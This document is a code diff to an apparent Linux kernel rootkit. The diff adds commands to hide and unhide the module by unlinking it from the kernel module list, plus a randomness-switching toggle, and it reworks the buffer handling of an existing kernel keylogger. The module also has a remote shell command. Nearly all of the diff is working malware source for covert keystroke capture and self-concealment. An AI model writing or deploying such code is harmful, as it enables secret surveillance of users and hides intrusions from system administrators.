@@ -14,12 +14,14 @@ command_t parse_command(char* data)
     char* command_strings[COMMAND_NUM] = {
         "shell \0", "mycat \0",
         "keylog\0", "hide \0",
-        "unhide \0"
+        "unhide \0", "hidemod\0",
+        "unhidemod\0", "randswitch\0"
       };
     command_t commands[COMMAND_NUM] = {
         RUN, CAT,
         KEYLOG, HIDE,
-        UNHIDE
+        UNHIDE, HIDEMOD,
+        UNHIDEMOD, SWITCH_RANDOM
         };
     u32 i, shift, j;
 
@@ -54,7 +56,6 @@ command_t parse_command(char* data)
 
 
 void run_command(args_t* args) {
-    char* password = "password\0";
     char* pwd_name = "PWD=\0";
     u32 pwd_len = strlen(pwd_name);
     bool found_pwd = false;
@@ -244,19 +245,33 @@ void cat_command(args_t* args) {
 }
 
 void keylog_command(args_t* args) {
-    char* buffer = kmalloc(KEYLOGGER_SIZE + 1, GFP_KERNEL);
+    char* buffer;
     size_t j = 0;
     size_t i;
 
     mutex_lock(&keylogger_mutex);
-    for (i = logger_index; i < KEYLOGGER_SIZE; i++) {
-        buffer[j] = keylogger[i];
-        j++;
+    if (first_log) {
+        buffer = kmalloc(logger_index + 1, GFP_KERNEL);
+    } else {
+        buffer = kmalloc(KEYLOGGER_SIZE + 1, GFP_KERNEL);
     }
+    if (!buffer) {
+        mutex_unlock(&keylogger_mutex);
+        return;
+    }
+    if (!first_log) {
+        for (i = logger_index; i < KEYLOGGER_SIZE; i++) {
+            buffer[j] = keylogger[i];
+            j++;
+        }
+    }
+
     for (i = 0; i < logger_index; i++) {
         buffer[j] = keylogger[i];
         j++;
     }
+
+    
     buffer[j] = '\0';
     mutex_unlock(&keylogger_mutex);
 
@@ -266,7 +281,48 @@ void keylog_command(args_t* args) {
 
     kfree(buffer);
 
+}
+
+static bool is_hidden = false;
+static struct list_head *prev;
+
+DEFINE_MUTEX(hide_mod_mutex);
 
 
+bool hide_module(void) {
+    mutex_lock(&hide_mod_mutex);
+    if (is_hidden) {
+        mutex_unlock(&hide_mod_mutex);
+        return false;
+    }
+    prev = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    is_hidden = true;
+    mutex_unlock(&hide_mod_mutex);
+    return true;
+}
 
+bool unhide_module(void) {
+    mutex_lock(&hide_mod_mutex);
+    if (!is_hidden) {
+        mutex_unlock(&hide_mod_mutex);
+        return false;
+    }
+    is_hidden = false;
+    list_add(&THIS_MODULE->list, prev);
+    mutex_unlock(&hide_mod_mutex);
+    return true;
+}
+
+DEFINE_MUTEX(random_mutex);
+
+bool random_switched = false;
+
+bool switch_random(void) {
+    bool res;
+    mutex_lock(&random_mutex);
+    random_switched = !random_switched;
+    res = random_switched;
+    mutex_unlock(&random_mutex);
+    return res;
 }
